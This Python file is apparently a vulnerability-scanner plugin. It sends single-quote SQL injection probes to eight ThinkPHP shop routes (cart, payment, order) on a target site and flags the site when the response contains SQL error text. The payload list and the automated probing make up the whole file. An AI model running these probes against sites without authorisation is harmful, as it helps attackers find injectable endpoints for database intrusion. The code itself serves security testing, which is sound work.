import urllib
import requests


def thinkphp_multi_sql_leak(url):
    relsult = {
        'name': 'thinkphp_multi_sql_leak',
        'vulnerable': False
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    payloads = [
        r'index.php?s=/home/shopcart/getPricetotal/tag/1%27',
        r'index.php?s=/home/shopcart/getpriceNum/id/1%27',
        r'index.php?s=/home/user/cut/id/1%27',
        r'index.php?s=/home/service/index/id/1%27',
        r'index.php?s=/home/pay/chongzhi/orderid/1%27',
        r'index.php?s=/home/order/complete/id/1%27',
        r'index.php?s=/home/order/detail/id/1%27',
        r'index.php?s=/home/order/cancel/id/1%27',
    ]
    try:
        for payload in payloads:
            vurl = urllib.parse.urljoin(url, payload)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"SQL syntax" in req.text:
                relsult['vulnerable'] = True
                relsult['method'] = 'GET'
                relsult['url'] = url
                relsult['payload'] = vurl
                return relsult
        return relsult
    except:
        return relsult
